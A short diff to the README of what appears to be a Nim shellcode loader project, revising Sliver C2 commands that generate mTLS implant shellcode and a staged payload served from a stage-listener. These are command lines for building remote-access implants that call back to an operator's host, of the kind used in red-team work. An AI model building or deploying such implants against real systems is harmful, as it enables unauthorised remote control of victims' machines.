@@ -47,10 +47,10 @@ nim c -d:noRES NimSyscallLoader.nim
 # Raw shellcode (full implant as PIC)
 sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
 
-# Or a small stager (needs a stage-listener running)
+# Or a staged payload (needs a stage-listener running)
 sliver > profiles new --mtls <IP>:<PORT> --format shellcode my-profile
 sliver > stage-listener --url http://<IP>:8080 --profile my-profile
-sliver > generate --format shellcode --stage-listener http://<IP>:8080 --save /tmp/stager.bin
+sliver > profiles stage --save /tmp/stage2.bin my-profile
 ```
 
 You can also pack a standalone `.exe` (`--format exe`) or a .NET assembly.
